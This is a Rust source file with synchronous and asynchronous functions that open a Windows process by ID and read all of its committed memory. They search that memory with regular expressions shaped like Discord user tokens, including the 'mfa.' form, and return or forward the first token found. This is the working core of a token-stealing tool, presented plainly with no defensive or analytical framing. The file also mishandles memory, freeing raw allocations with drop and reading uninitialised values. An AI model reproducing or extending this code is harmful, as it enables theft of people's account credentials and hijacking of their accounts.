pub mod proc;

#[cfg(feature = "async")] mod resources;
#[cfg(feature = "async")] pub use resources::*;

use crate::Export;
use crate::error::Error;
use crate::winapi::*;
use libc::malloc;
use std::mem;
use std::os::raw::c_char;
use regex::bytes::RegexBuilder;



macro_rules! return_err {
    ($variant:tt) => {
        return Err(Error::$variant);
    };
}


struct MemRegion {
    start: u64,
    size: usize,
}

pub unsafe fn convert_proc_name(proc_name: *mut c_char) -> Result<String, Export> {
    use std::ffi::CString;

    if let Ok(proc_name) = CString::from_raw(proc_name).into_string() {
        Ok(proc_name)
    } else {
        Err(Export::new_error(Error::InvalidArgument, proc_name as *const c_char))
    }
}

#[cfg(not(feature = "async"))]
pub unsafe  fn mem_search(pid: u32) -> Result<String, Error> {
    let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if handle.is_null() || handle == INVALID_HANDLE_VALUE {
        return_err!(OpenProcessFailed);
    }

    let mut token: Option<String> = None;
    let mut address = 0_u64;
    let mut size = *(malloc(mem::size_of::<SIZE_T>()) as *mut SIZE_T);

    let rx_normal = RegexBuilder::new(r"([\w-]{24}\.[\w-]{6}\.[\w-]{27})").ignore_whitespace(true).multi_line(false).unicode(false).build().unwrap();
    let rx_mfa = RegexBuilder::new(r"(mfa\.[\w-]{84})").ignore_whitespace(true).multi_line(false).unicode(false).build().unwrap();

    let system_info = malloc(mem::size_of::<SYSTEM_INFO>()) as *mut SYSTEM_INFO;
    GetSystemInfo(system_info);
    let page_size = (*system_info).dwPageSize;
    drop(system_info);

    if page_size == 0 {
        return_err!(PageSizeZero);
    }

    while address <= 0x_ffff_ffff {
        let mbi = malloc(mem::size_of::<MEMORY_BASIC_INFORMATION>()) as *mut MEMORY_BASIC_INFORMATION;
        if VirtualQueryEx(
            handle,
            address as LPCVOID,
            mbi,
            mem::size_of::<MEMORY_BASIC_INFORMATION>()
        ) == 0 {
            address += page_size as u64;
            drop(mbi);
        } else {
            if (*mbi).State == MEM_COMMIT && (*mbi).Protect & PAGE_GUARD != PAGE_GUARD {
                let region = MemRegion {
                    start: (*mbi).BaseAddress as u64,
                    size: (*mbi).RegionSize,
                };

                drop(mbi);

                let mut buffer: Vec<u8> = vec![0_u8; region.size];

                if ReadProcessMemory(
                    handle,
                    region.start as LPCVOID,
                    buffer.as_mut_ptr() as *mut _,
                    buffer.len(),
                    &mut size,
                ) == FALSE {
                    // ToDo: Fix invalid memory regions
                    // println!("[{}] ReadSize:[{}] RegionSize:[{}]  Error:[0x{:x}]", pid, size, region.size, GetLastError());
                } else {

                    token = if let Some(cap) = rx_mfa.captures(&buffer) {
                        Some(format!("{}", String::from_utf8_lossy(cap.get(0).unwrap().as_bytes())))
                    } else if let Some(cap) = rx_normal.captures(&buffer) {
                        Some(format!("{}", String::from_utf8_lossy(cap.get(0).unwrap().as_bytes())))
                    } else {
                        None
                    };

                    if token.is_some() {
                        break;
                    }
                }
            }

            address = (*mbi).BaseAddress as u64 + (*mbi).RegionSize as u64;
        }
    }

    drop(size);
    CloseHandle(handle);

    match token {
        None => return_err!(NoToken),
        Some(token) => return Ok(token),
    };
}

#[cfg(feature = "async")]
pub async unsafe fn mem_search(pid: u32, sender: mpsc::Sender<resources::Directive>) -> Result<String, Error> {
    let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if handle.is_null() || handle == INVALID_HANDLE_VALUE {
        return_err!(OpenProcessFailed);
    }

    let mut handles = Vec::new();
    let mut error: Option<Error> = None;
    let mut address = 0_u64;
    let mut size = *(malloc(mem::size_of::<SIZE_T>()) as *mut SIZE_T);

    let rx_normal = Arc::new(RegexBuilder::new(r"([\w-]{24}\.[\w-]{6}\.[\w-]{27})").ignore_whitespace(true).multi_line(false).unicode(false).build().unwrap());
    let rx_mfa = Arc::new(RegexBuilder::new(r"(mfa\.[\w-]{84})").ignore_whitespace(true).multi_line(false).unicode(false).build().unwrap());

    let system_info = malloc(mem::size_of::<SYSTEM_INFO>()) as *mut SYSTEM_INFO;
    GetSystemInfo(system_info);
    let page_size = (*system_info).dwPageSize;
    drop(system_info);

    if page_size == 0 {
        return_err!(PageSizeZero);
    }

    while address <= 0x_ffff_ffff {
        let mbi = malloc(mem::size_of::<MEMORY_BASIC_INFORMATION>()) as *mut MEMORY_BASIC_INFORMATION;
        if VirtualQueryEx(
            handle,
            address as LPCVOID,
            mbi,
            mem::size_of::<MEMORY_BASIC_INFORMATION>()
        ) == 0 {
            address += page_size as u64;
            drop(mbi);
        } else {
            if (*mbi).State == MEM_COMMIT && (*mbi).Protect & PAGE_GUARD != PAGE_GUARD {
                let region = MemRegion {
                    start: (*mbi).BaseAddress as u64,
                    size: (*mbi).RegionSize,
                };

                drop(mbi);

                let mut buffer: Vec<u8> = vec![0_u8; region.size];

                if ReadProcessMemory(
                    handle,
                    region.start as LPCVOID,
                    buffer.as_mut_ptr() as *mut _,
                    buffer.len(),
                    &mut size,
                ) == FALSE {
                    // ToDo: Fix invalid memory regions
                    // println!("[{}] ReadSize:[{}] RegionSize:[{}]  Error:[0x{:x}]", pid, size, region.size, GetLastError());
                } else {
                    let (os_sender, os_receiver) = oneshot::channel();
                    if sender.send(resources::Directive::CheckToken {
                        resp: os_sender
                    }).await.is_err() {
                        error = Some(Error::AsyncClosed);
                        break;
                    };

                    let exists = if let Ok(data) = os_receiver.await {
                        data
                    } else {
                        error = Some(Error::AsyncClosed);
                        break;
                    };

                    if !exists {
                        let th_rx_normal = rx_normal.clone();
                        let th_rx_mfa = rx_mfa.clone();
                        let th_buffer = mem::take(&mut buffer);
                        let th_sender = sender.clone();
                        handles.push(tokio::spawn(async move {
                            let token = if let Some(cap) = th_rx_mfa.captures(&th_buffer) {
                                format!("{}", String::from_utf8_lossy(cap.get(0).unwrap().as_bytes()))
                            } else if let Some(cap) = th_rx_normal.captures(&th_buffer) {
                                format!("{}", String::from_utf8_lossy(cap.get(0).unwrap().as_bytes()))
                            } else {
                                String::new()
                            };

                            if !token.is_empty() {
                                th_sender.send(Directive::SendToken {
                                    token,
                                }).await.ok();
                            }
                        }));
                    }
                }
            }

            address = (*mbi).BaseAddress as u64 + (*mbi).RegionSize as u64;
        }
    }

    drop(size);
    CloseHandle(handle);

    match error {
        None => {
            drop(futures::future::join_all(handles).await);

            let (os_sender, os_receiver) = oneshot::channel();
            if sender.send(resources::Directive::TakeToken {
                resp: os_sender
            }).await.is_err() {
                return_err!(AsyncClosed);
            };

            let token = if let Ok(data) = os_receiver.await {
                data
            } else {
                return_err!(AsyncClosed);
            };

            if token.is_none() {
                return_err!(NoToken);
            }
            Ok(token.unwrap())
        },
        Some(e) => Err(e),
    }
}
